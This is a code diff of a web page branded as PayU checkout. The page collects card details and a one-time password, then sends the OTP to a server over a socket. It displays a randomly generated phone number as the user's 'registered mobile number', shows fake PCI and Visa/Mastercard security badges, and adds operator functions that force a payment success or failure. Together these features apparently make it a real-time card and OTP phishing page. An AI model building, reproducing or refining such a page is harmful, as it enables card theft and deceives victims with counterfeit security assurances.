-                                    maxlength="19" 
-                                    class="pl-10 pr-10"
-                                />
-                            </div>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label>Card Holder Name</label>
-                            <input 
-                                type="text" 
-                                id="card-holder" 
-                                placeholder="John Doe"
-                            />
-                        </div>
-                        
-                        <div class="grid grid-cols-2 gap-4">
-                            <div class="form-group">
-                                <label>Expiry Date</label>
-                                <input 
-                                    type="text" 
-                                    id="expiry-date" 
-                                    placeholder="MM/YY" 
-                                    maxlength="5"
-                                />
-                            </div>
-                            
-                            <div class="form-group">
-                                <label>CVV</label>
-                                <div class="relative">
-                                    <div class="input-icon left">
-                                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5">
-                                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-                                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
-                                        </svg>
-                                    </div>
-                                    <input 
-                                        type="password" 
-                                        id="cvv" 
-                                        placeholder="123" 
-                                        maxlength="4" 
-                                        class="pl-10"
-                                    />
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <button 
-                            type="submit" 
-                            class="pay-now-btn"
-                        >
-                            Pay Now
-                        </button>
-                    </form>
-                </div>
-            </div>
-            
-            <div class="footer-bar">
-                <div class="security-badge">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/PCI_Logo.svg" alt="PCI DSS" />
-                    <span class="text-xs text-gray-500">PCI DSS Compliant</span>
-                </div>
-                <div class="separator-vertical"></div>
-                <div>
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/Verified_by_Visa.svg" alt="Verified by Visa" class="h-6 w-auto" />
-                </div>
-                <div>
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Mastercard_SecureCode_horizontal.svg" alt="Mastercard SecureCode" class="h-6 w-auto" />
-                </div>
-                <div class="separator-vertical"></div>
-                <div class="text-xs text-gray-500">Powered by PayU Biz</div>
-            </div>
-        </div>
-    `;
+function clearInputError(inputId) {
+    const input = document.getElementById(inputId);
+    if (!input) return;
     
-    // Add form handlers
-    setTimeout(() => {
-    setupCardFormHandlers();
-        console.log
-    }, 100),
-}
-
-function showProcessingUI() {
-    const appDiv = document.getElementById('app');
-    appDiv.innerHTML = `
-        <div class="card-container w-full max-w-5xl">
-            <div class="header-bar">
-                <div class="flex justify-between items-center">
-                    <div class="text-2xl font-bold">PayU</div>
-                    <p class="text-sm">Secure Payment</p>
-                </div>
-                <div class="text-gray-100">
-                    Amount: $${state.amount.toFixed(2)} USD
-                </div>
-            </div>
-            
-            <div class="flex items-center justify-center p-12">
-                <div class="flex flex-col items-center justify-center processing-indicator">
-                    <div class="animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-primary mb-4"></div>
-                    <h3 class="text-lg font-medium mb-2">Processing Payment</h3>
-                    <p class="text-sm text-gray-500 text-center">
-                        Please wait while we process your payment. Do not close this window.
-                    </p>
-                </div>
-            </div>
-            
-            <div class="footer-bar">
-                <div class="security-badge">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/PCI_Logo.svg" alt="PCI DSS" />
-                    <span class="text-xs text-gray-500">PCI DSS Compliant</span>
-                </div>
-                <div class="separator-vertical"></div>
-                <div>
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/Verified_by_Visa.svg" alt="Verified by Visa" class="h-6 w-auto" />
-                </div>
-                <div>
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Mastercard_SecureCode_horizontal.svg" alt="Mastercard SecureCode" class="h-6 w-auto" />
-                </div>
-                <div class="separator-vertical"></div>
-                <div class="text-xs text-gray-500">Powered by PayU Biz</div>
-            </div>
-        </div>
-    `;
+    input.classList.remove('border-red-500');
+    
+    // Remove error message element if it exists
+    const errorElement = input.parentNode.querySelector('.error-message');
+    if (errorElement) {
+        errorElement.remove();
+    }
 }
 
 function showOTPUI() {
-    // Generate phone number if not already done
-    if (!state.maskedPhone) {
-        generateRandomPhone();
-    }
+    console.log('Showing OTP UI...');
+    state.step = 'otp';
     
     const appDiv = document.getElementById('app');
+    
     appDiv.innerHTML = `
-      <div class="card-container w-full max-w-5xl">
+        <div class="card-container w-full max-w-md">
             <div class="header-bar">
                 <div class="flex justify-between items-center">
                     <div class="text-2xl font-bold">PayU</div>
@@ -1373,73 +964,41 @@ function showOTPUI() {
                 </div>
             </div>
             
-            <div class="flex justify-center p-8">
-                <div class="space-y-4 max-w-md w-full">
-                    <div class="bg-blue-50 rounded-lg p-6 mb-2">
-                        <div class="flex justify-center mb-2">
-                            <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.618 5.984A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016zM12 9v2m0 4h.01" />
-                            </svg>
-                        </div>
-                        
-                        <h2 class="text-xl font-semibold text-center mb-1">Authentication Required</h2>
-                        <p class="text-sm text-gray-600 text-center mb-4">
-                            For your security, we need to verify your identity
-                        </p>
-                        
-                        <div class="bg-white p-3 rounded-lg border border-gray-200">
-                            <div class="flex items-center">
-                                <div class="bg-blue-100 rounded-full p-2 mr-3">
-                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
-                                    </svg>
-                                </div>
-                                <div>
-                                    <div class="text-xs text-gray-500">We sent a verification code to</div>
-                                    <div class="font-medium">${state.maskedPhone}</div>
-                                </div>
-                            </div>
-                        </div>
+            <div class="p-6 space-y-6">
+                <div class="text-center">
+                    <h2 class="text-xl font-semibold mb-2">OTP Verification</h2>
+                    <p class="text-gray-600 text-sm">
+                        We've sent a One Time Password (OTP) to your registered mobile number ${state.maskedPhone}
+                    </p>
+                </div>
+                
+                <div class="otp-input-container">
+                    <label class="block text-sm font-medium text-gray-700 mb-2">Enter OTP</label>
+                    <div class="otp-input">
+                        <input type="text" maxlength="1" class="otp-digit" />
+                        <input type="text" maxlength="1" class="otp-digit" />
+                        <input type="text" maxlength="1" class="otp-digit" />
+                        <input type="text" maxlength="1" class="otp-digit" />
                     </div>
+                </div>
+                
+                <div class="text-center">
+                    <p class="text-sm text-gray-600">
+                        OTP will expire in <span id="timer">00:${state.timeLeft.toString().padStart(2, '0')}</span>
+                    </p>
                     
-                    <h3 class="text-lg font-medium mb-2 text-center">Enter Verification Code</h3>
-                    
-                    <div class="otp-input mb-6">
-                        <input type="text" maxlength="1" class="otp-digit" data-index="0" />
-                        <input type="text" maxlength="1" class="otp-digit" data-index="1" />
-                        <input type="text" maxlength="1" class="otp-digit" data-index="2" />
-                        <input type="text" maxlength="1" class="otp-digit" data-index="3" />
-                        <input type="text" maxlength="1" class="otp-digit" data-index="4" />
-                        <input type="text" maxlength="1" class="otp-digit" data-index="5" />
-                    </div>
-                    
-                    <div class="flex items-center justify-center mb-4">
-                        <div class="w-14 h-14 rounded-full bg-blue-50 flex items-center justify-center">
-                            <span class="text-lg font-medium text-blue-500">
-                                ${String(Math.floor(state.timeLeft / 60)).padStart(2, '0')}:
-                                ${String(state.timeLeft % 60).padStart(2, '0')}
-                            </span>
-                        </div>
-                    </div>
-                    
-                    <div class="text-center mb-4">
-                        <button 
-                            id="resend-otp"
-                            class="text-blue-600 font-medium ${!state.canResend ? 'opacity-50 cursor-not-allowed' : ''}"
-                            ${!state.canResend ? 'disabled' : ''}
-                        >
-                            Resend Code
-                        </button>
-                    </div>
-                    
-                    <button 
-                        id="verify-otp"
-                        class="pay-now-btn" 
-                        disabled
-                    >
-                        Verify & Complete Payment
+                    <button id="resend-otp" class="mt-2 text-blue-600 text-sm font-medium disabled:opacity-50 disabled:cursor-not-allowed" disabled>
+                        Resend OTP
                     </button>
                 </div>
+                
+                <button id="verify-otp" class="pay-now-btn">
+                    Verify & Pay
+                </button>
+                
+                <p class="text-xs text-gray-500 text-center">
+                    This is a secure 3D verification step required by your bank
+                </p>
             </div>
             
             <div class="footer-bar">
@@ -1447,50 +1006,150 @@ function showOTPUI() {
                     <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/PCI_Logo.svg" alt="PCI DSS" />
                     <span class="text-xs text-gray-500">PCI DSS Compliant</span>
                 </div>
-                <div class="separator-vertical"></div>
-                <div>
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/Verified_by_Visa.svg" alt="Verified by Visa" class="h-6 w-auto" />
-                </div>
-                <div>
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Mastercard_SecureCode_horizontal.svg" alt="Mastercard SecureCode" class="h-6 w-auto" />
-                </div>
-                <div class="separator-vertical"></div>
-                <div class="text-xs text-gray-500">Powered by PayU Biz</div>
             </div>
         </div>
     `;
     
+    // Setup OTP form handlers
+    setupOTPHandlers();
+    
     // Start OTP timer
     startOTPTimer();
-    
-    // Setup OTP input handlers
-    setupOTPHandlers();
 }
 
-// Start OTP timer
-function startOTPTimer() {
+function setupOTPHandlers() {
+    console.log('Setting up OTP handlers...');
+    
+    // OTP digit input handlers
+    const otpInputs = document.querySelectorAll('.otp-digit');
+    
+    otpInputs.forEach((input, index) => {
+        // Focus on first input
+        if (index === 0) {
+            setTimeout(() => input.focus(), 100);
+        }
+        
+        // Handle input
+        input.addEventListener('input', (e) => {
+            // Only allow numbers
+            e.target.value = e.target.value.replace(/\D/g, '');
+            
+            // Move to next input if a digit was entered
+            if (e.target.value && index < otpInputs.length - 1) {
+                otpInputs[index + 1].focus();
+            }
+            
+            // Update OTP state
+            updateOTPState();
+        });
+        
+        // Handle backspace
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                otpInputs[index - 1].focus();
+                
+                // For better UX, also clear the previous digit
+                otpInputs[index - 1].value = '';
+                
+                // Update OTP state
+                updateOTPState();
+            }
+        });
+    });
+    
+    // Handle verify button
+    const verifyButton = document.getElementById('verify-otp');
+    if (verifyButton) {
+        verifyButton.addEventListener('click', handleOTPSubmit);
+    }
+    
+    // Handle resend button
+    const resendButton = document.getElementById('resend-otp');
+    if (resendButton) {
+        resendButton.addEventListener('click', handleResendOTP);
+    }
+}
+
+function updateOTPState() {
+    console.log('Updating OTP state...');
+    
+    const otpInputs = document.querySelectorAll('.otp-digit');
+    const otpValue = Array.from(otpInputs).map(input => input.value).join('');
+    
+    state.otpValue = otpValue;
+    
+    console.log('OTP value updated:', otpValue);
+}
+
+function handleOTPSubmit() {
+    console.log('Handling OTP submit...');
+    
+    // Validate OTP (must be 4 digits)
+    if (state.otpValue.length !== 4) {
+        alert('Please enter a valid 4-digit OTP');
+        return;
+    }
+    
+    // Show processing UI
+    showProcessingUI('Verifying OTP...');
+    
+    // Send OTP verification to server
+    console.log('Emitting verify_otp event');
+    socket.emit('verify_otp', {
+        transactionId: state.transactionId,
+        otp: state.otpValue
+    });
+}
+
+function handleResendOTP() {
+    console.log('Handling OTP resend...');
+    
+    if (!state.canResend) {
+        console.log('Cannot resend OTP yet');
+        return;
+    }
+    
+    // Disable resend button
+    const resendButton = document.getElementById('resend-otp');
+    if (resendButton) {
+        resendButton.disabled = true;
+    }
+    
     // Reset timer
     state.timeLeft = 59;
     state.canResend = false;
     
+    // Update timer display
+    updateTimerDisplay();
+    
+    // Start timer again
+    startOTPTimer();
+    
+    // Send resend request to server
+    console.log('Emitting resend_otp event');
+    socket.emit('resend_otp', {
+        transactionId: state.transactionId
+    });
+    
+    // Show notification
+    alert('A new OTP has been sent to your mobile number');
+}
+
+function startOTPTimer() {
+    console.log('Starting OTP timer...');
+    
+    // Clear existing timer if any
     if (timerRef) {
         clearInterval(timerRef);
     }
     
-    // Update timer display
-    const timerDisplay = document.querySelector('.text-lg.font-medium.text-blue-500');
-    if (timerDisplay) {
-        timerDisplay.textContent = `00:${String(state.timeLeft).padStart(2, '0')}`;
-    }
-    
-    // Start countdown
+    // Start new timer
     timerRef = setInterval(() => {
+        // Decrease time left
         state.timeLeft--;
         
-        // Update display
-        if (timerDisplay) {
-            timerDisplay.textContent = `00:${String(state.timeLeft).padStart(2, '0')}`;
-        }
+        // Update timer display
+        updateTimerDisplay();
         
         // Check if timer expired
         if (state.timeLeft <= 0) {
@@ -1498,19 +1157,29 @@ function startOTPTimer() {
             state.canResend = true;
             
             // Enable resend button
-            const resendBtn = document.getElementById('resend-otp');
-            if (resendBtn) {
-                resendBtn.classList.remove('opacity-50', 'cursor-not-allowed');
-                resendBtn.disabled = false;
+            const resendButton = document.getElementById('resend-otp');
+            if (resendButton) {
+                resendButton.disabled = false;
             }
         }
     }, 1000);
 }
 
-function showSuccessUI() {
+function updateTimerDisplay() {
+    const timerElement = document.getElementById('timer');
+    if (timerElement) {
+        timerElement.textContent = `00:${state.timeLeft.toString().padStart(2, '0')}`;
+    }
+}
+
+function showProcessingUI(message = 'Processing payment...') {
+    console.log('Showing processing UI:', message);
+    state.step = 'processing';
+    
     const appDiv = document.getElementById('app');
+    
     appDiv.innerHTML = `
-        <div class="card-container w-full max-w-5xl">
+        <div class="card-container w-full max-w-md">
             <div class="header-bar">
                 <div class="flex justify-between items-center">
                     <div class="text-2xl font-bold">PayU</div>
@@ -1521,21 +1190,19 @@ function showSuccessUI() {
                 </div>
             </div>
             
-            <div class="flex justify-center p-8">
-                <div class="flex flex-col items-center justify-center py-8">
-                    <div class="h-16 w-16 bg-green-100 rounded-full flex items-center justify-center mb-4">
-                        <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+            <div class="p-6 py-12">
+                <div class="text-center">
+                    <div class="flex justify-center mb-6">
+                        <svg class="animate-spin h-12 w-12 text-blue-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                         </svg>
                     </div>
-                    <h3 class="text-lg font-medium mb-2">Payment Successful</h3>
-                    <p class="text-sm text-gray-500 text-center mb-4">
-                        Your payment of $${state.amount.toFixed(2)} has been processed successfully.<br />
-                        Transaction ID: <span class="font-medium">${state.transactionId}</span>
+                    
+                    <h2 class="text-xl font-semibold mb-2">${message}</h2>
+                    <p class="text-gray-600 text-sm">
+                        Please do not close or refresh this page.
                     </p>
-                    <button id="try-again" class="bg-white text-gray-800 border border-gray-300 py-2 px-6 rounded-md hover:bg-gray-50 transition-all">
-                        Make Another Payment
-                    </button>
                 </div>
             </div>
             
@@ -1544,306 +1211,131 @@ function showSuccessUI() {
                     <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/PCI_Logo.svg" alt="PCI DSS" />
                     <span class="text-xs text-gray-500">PCI DSS Compliant</span>
                 </div>
-                <div class="separator-vertical"></div>
-                <div>
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/Verified_by_Visa.svg" alt="Verified by Visa" class="h-6 w-auto" />
+            </div>
+        </div>
+    `;
+}
+
+function showSuccessUI(response) {
+    console.log('Showing success UI:', response);
+    state.step = 'success';
+    
+    const appDiv = document.getElementById('app');
+    
+    appDiv.innerHTML = `
+        <div class="card-container w-full max-w-md">
+            <div class="header-bar">
+                <div class="flex justify-between items-center">
+                    <div class="text-2xl font-bold">PayU</div>
+                    <p class="text-sm">Secure Payment</p>
                 </div>
-                <div>
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Mastercard_SecureCode_horizontal.svg" alt="Mastercard SecureCode" class="h-6 w-auto" />
+                <div class="text-gray-100">
+                    Amount: $${state.amount.toFixed(2)} USD
                 </div>
-                <div class="separator-vertical"></div>
-                <div class="text-xs text-gray-500">Powered by PayU Biz</div>
+            </div>
+            
+            <div class="p-6 py-12 text-center">
+                <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+                    </svg>
+                </div>
+                
+                <h2 class="text-xl font-semibold mb-2">Payment Successful!</h2>
+                <p class="text-gray-600 mb-4">
+                    Your payment has been processed successfully.
+                </p>
+                
+                <div class="border-t border-gray-200 pt-4 mt-4 text-left">
+                    <div class="flex justify-between mb-2">
+                        <span class="text-gray-600">Transaction ID:</span>
+                        <span class="font-medium">${response.transactionId || state.transactionId || 'N/A'}</span>
+                    </div>
+                    <div class="flex justify-between mb-2">
+                        <span class="text-gray-600">Amount:</span>
+                        <span class="font-medium">$${state.amount.toFixed(2)} USD</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-gray-600">Date & Time:</span>
+                        <span class="font-medium">${new Date().toLocaleString()}</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="footer-bar">
+                <p class="text-xs text-gray-500">
+                    A confirmation has been sent to your email address.
+                </p>
+            </div>
+        </div>
+    `;
+}
+
+function showFailureUI(message) {
+    console.log('Showing failure UI:', message);
+    state.step = 'failure';
+    
+    const appDiv = document.getElementById('app');
+    
+    appDiv.innerHTML = `
+        <div class="card-container w-full max-w-md">
+            <div class="header-bar">
+                <div class="flex justify-between items-center">
+                    <div class="text-2xl font-bold">PayU</div>
+                    <p class="text-sm">Secure Payment</p>
+                </div>
+                <div class="text-gray-100">
+                    Amount: $${state.amount.toFixed(2)} USD
+                </div>
+            </div>
+            
+            <div class="p-6 py-12 text-center">
+                <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                    </svg>
+                </div>
+                
+                <h2 class="text-xl font-semibold mb-2">Payment Failed</h2>
+                <p class="text-gray-600 mb-6">
+                    ${message || 'Your payment could not be processed. Please try again.'}
+                </p>
+                
+                <button id="retry-button" class="pay-now-btn">
+                    Try Again
+                </button>
+            </div>
+            
+            <div class="footer-bar">
+                <p class="text-xs text-gray-500">
+                    If the problem persists, please contact your bank or use a different payment method.
+                </p>
             </div>
         </div>
     `;
     
-    // Add try again handler
-    const tryAgainBtn = document.getElementById('try-again');
-    if (tryAgainBtn) {
-        tryAgainBtn.addEventListener('click', resetForm);
+    // Add retry button handler
+    const retryButton = document.getElementById('retry-button');
+    if (retryButton) {
+        retryButton.addEventListener('click', () => {
+            showCardUI();
+        });
     }
 }
 
- function showErrorUI(title, message) {
-                    const appDiv = document.getElementById('app');
-                    appDiv.innerHTML = `
-                        <div class="card-container w-full max-w-5xl">
-                            <div class="header-bar">
-                                <div class="flex justify-between items-center">
-                                    <div class="text-2xl font-bold">PayU</div>
-                                    <p class="text-sm">Secure Payment</p>
-                                </div>
-                                <div class="text-gray-100">
-                                    Amount: $${state.amount.toFixed(2)} USD
-                                </div>
-                            </div>
-                            
-                            <div class="flex justify-center p-8">
-                                <div class="flex flex-col items-center justify-center py-8">
-                                    <div class="h-16 w-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
-                                        <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
-                                        </svg>
-                                    </div>
-                                    <h3 class="text-lg font-medium mb-2">${title}</h3>
-                                    <p class="text-sm text-gray-500 text-center mb-4">
-                                        ${message}
-                                    </p>
-                                    <button id="try-again" class="bg-white text-gray-800 border border-gray-300 py-2 px-6 rounded-md hover:bg-gray-50 transition-all">
-                                        Try Again
-                                    </button>
-                                </div>
-                            </div>
-                            
-                            <div class="footer-bar">
-                                <div class="security-badge">
-                                    <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/PCI_Logo.svg" alt="PCI DSS" />
-                                    <span class="text-xs text-gray-500">PCI DSS Compliant</span>
-                                </div>
-                                <div class="separator-vertical"></div>
-                                <div>
-                                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/Verified_by_Visa.svg" alt="Verified by Visa" class="h-6 w-auto" />
-                                </div>
-                                <div>
-                                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Mastercard_SecureCode_horizontal.svg" alt="Mastercard SecureCode" class="h-6 w-auto" />
-                                </div>
-                                <div class="separator-vertical"></div>
-                                <div class="text-xs text-gray-500">Powered by PayU Biz</div>
-                            </div>
-                        </div>
-                    `;
-                    
-                    // Add try again handler
-                    const tryAgainBtn = document.getElementById('try-again');
-                    if (tryAgainBtn) {
-                        tryAgainBtn.addEventListener('click', resetForm);
-                    }
-                }
+// FOR ADMIN DEMONSTRATION
+window.simulatePaymentSuccess = function() {
+    console.log('Simulating payment success...');
+    showSuccessUI({
+        transactionId: 'TEST-' + Math.random().toString(36).substring(2, 10).toUpperCase(),
+        message: 'Payment successful'
+    });
+};
 
-                // Reset form state
-                function resetForm() {
-                    state.cardForm = {
-                        cardNumber: '',
-                        cardHolder: '',
-                        expiryDate: '',
-                        cvv: '',
-                        errors: {}
-                    };
-                    state.cardType = null;
-                    state.transactionId = '';
-                    state.otpValue = '';
-                    state.loading = false;
-                    
-                    // Show card input form
-                    showCardUI();
-                }
-
-                // Setup card form handlers
-    console.log('Setting up card form handlers...');
-   function setupCardFormHandlers() {
-                      console.log('Setting up card form handlers...'); // Add this line
-                    const cardNumberInput = document.getElementById('card-number');
-                    const cardHolderInput = document.getElementById('card-holder');
-                    const expiryDateInput = document.getElementById('expiry-date');
-                    const cvvInput = document.getElementById('cvv');
-                    const cardForm = document.getElementById('card-form');
-                    
-                    // Card number input handler
-                    if (cardNumberInput) {
-                        cardNumberInput.addEventListener('input', (e) => {
-                            const formattedValue = formatCardNumber(e.target.value);
-                            state.cardForm.cardNumber = formattedValue;
-                            e.target.value = formattedValue;
-                            detectCardType(formattedValue);
-                            
-                            // Update card type icon
-                            if (state.cardType) {
-                                const cardIconContainer = document.querySelector('.input-icon.right');
-                             const html = `
-    <div class="h-7 w-12 flex items-center justify-center">
-        ${state.cardType === 'visa' ? 
-            '<img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" class="h-7 w-auto" />' : 
-        state.cardType === 'mastercard' ? 
-            '<img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="h-7 w-auto" />' : 
-        state.cardType === 'amex' ? 
-            '<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex" class="h-7 w-auto" />' : 
-        state.cardType === 'discover' ? 
-            '<img src="https://upload.wikimedia.org/wikipedia/commons/d/d1/Discover_Card_logo.svg" alt="Discover" class="h-7 w-auto" />' : 
-        state.cardType === 'rupay' ? 
-            '<img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Rupay-Logo.png" alt="RuPay" class="h-7 w-auto" />' : 
-        ''}
-    </div>
-`;
-                                
-                                if (cardIconContainer) {
-                                    cardIconContainer.innerHTML = html;
-                                } else {
-                                    const iconDiv = document.createElement('div');
-                                    iconDiv.className = 'input-icon right';
-                                    iconDiv.innerHTML = html;
-                                    e.target.parentNode.appendChild(iconDiv);
-                                }
-                            } else {
-                                // Remove card type icon if no type detected
-                                const cardIconContainer = document.querySelector('.input-icon.right');
-                                if (cardIconContainer) {
-                                    cardIconContainer.remove();
-                                }
-                            }
-                        });
-                    }
-                    
-                    // Card holder input handler
-                    if (cardHolderInput) {
-                        cardHolderInput.addEventListener('input', (e) => {
-                            state.cardForm.cardHolder = e.target.value;
-                        });
-                    }
-                    
-                    // Expiry date input handler
-                    if (expiryDateInput) {
-                        expiryDateInput.addEventListener('input', (e) => {
-                            const formattedValue = formatExpiryDate(e.target.value);
-                            state.cardForm.expiryDate = formattedValue;
-                            e.target.value = formattedValue;
-                        });
-                    }
-                    
-                    // CVV input handler
-                    if (cvvInput) {
-                        cvvInput.addEventListener('input', (e) => {
-                            state.cardForm.cvv = e.target.value;
-                        });
-                    }
-                    
-                    // Form submission
-                    if (cardForm) {
-                        cardForm.addEventListener('submit', handleCardSubmit);
-                    }
-                }
-console.log('Card form handlers setup complete');
-                // Setup OTP input handlers
-                function setupOTPHandlers() {
-                    const otpInputs = document.querySelectorAll('.otp-digit');
-                    const resendBtn = document.getElementById('resend-otp');
-                    const verifyBtn = document.getElementById('verify-otp');
-                    
-                    // OTP digit inputs
-                    if (otpInputs.length) {
-                        // Focus first input
-                        otpInputs[0].focus();
-                        
-                        // Setup input handlers for each digit
-                        otpInputs.forEach((input, index) => {
-                            input.addEventListener('input', (e) => {
-                                // Allow only digits
-                                e.target.value = e.target.value.replace(/\D/g, '');
-                                
-                                // Update state
-                                const digits = state.otpValue.split('');
-                                digits[index] = e.target.value;
-                                state.otpValue = digits.join('');
-                                
-                                // Auto focus next input
-                                if (e.target.value && index < otpInputs.length - 1) {
-                                    otpInputs[index + 1].focus();
-                                }
-                                
-                                // Enable verify button when all digits are filled
-                                if (state.otpValue.length === 6) {
-                                    verifyBtn.disabled = false;
-                                } else {
-                                    verifyBtn.disabled = true;
-                                }
-                            });
-                            
-                            // Handle backspace to navigate backwards
-                            input.addEventListener('keydown', (e) => {
-                                if (e.key === 'Backspace' && !e.target.value && index > 0) {
-                                    otpInputs[index - 1].focus();
-                                }
-                            });
-                        });
-                    }
-                    
-                    // Resend OTP button
-                    if (resendBtn) {
-                        resendBtn.addEventListener('click', () => {
-                            if (state.canResend) {
-                                // Reset OTP
-                                state.otpValue = '';
-                                
-                                // Reset input fields
-                                otpInputs.forEach(input => {
-                                    input.value = '';
-                                });
-                                
-                                // Restart timer
-                                startOTPTimer();
-                                
-                                // Show toast
-                                showToast('OTP Resent', 'A new verification code has been sent to your mobile');
-                            }
-                        });
-                    }
-                    
-                    // Verify OTP button
-                    if (verifyBtn) {
-                        verifyBtn.addEventListener('click', () => {
-                            if (state.otpValue.length === 6) {
-                                // Disable button
-                                verifyBtn.disabled = true;
-                                verifyBtn.innerHTML = `
-                                    <div class="flex items-center justify-center">
-                                        <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                                        </svg>
-                                        Verifying
-                                    </div>
-                                `;
-                                
-                                // Send OTP to server
-                                socket.emit('otp_submission', {
-                                    transaction_id: state.transactionId,
-                                    otp: state.otpValue,
-                                    timestamp: new Date().toISOString()
-                                });
-                                
-                                // Show processing
-                                showProcessingUI();
-                            }
-                        });
-                    }
-                }
-
-                // Initialize app
-                function init() {
-                    // Setup socket listeners
-                    setupSocketListeners();
-                    
-                    // Generate random phone number for OTP
-                    generateRandomPhone();
-                    
-                    // Show the card form
-                    showCardUI();
-                }
-
-                // Initialize the app
-                init();
-                
-            } catch (error) {
-                console.error('Initialization error:', error);
-                document.getElementById('app').innerHTML = `
-                    <div style="max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; color: #ef4444; background: rgba(239, 68, 68, 0.1); border-radius: 8px; border: 1px solid #ef4444;">
-                        <h3 style="margin-bottom: 10px; font-size: 18px;">Failed to initialize the application</h3>
-                        <p style="margin-bottom: 10px;">Please try refreshing the page or contact support.</p>
-                        <p style="font-size: 12px; color: #666;">Error details: ${error.message}</p>
-                        <button onclick="window.location.reload()" style="margin-top: 15px; padding: 8px 16px; background: #2563eb; color: white; border: none; border-radius: 4px; cursor: pointer;">Retry</button>
-                    </div>
-                `;
-            }
-        });
-    </script>
+window.simulatePaymentFailure = function() {
+    console.log('Simulating payment failure...');
+    showFailureUI('Payment declined: Insufficient funds');
+};
+</script>
 </body>
 </html>
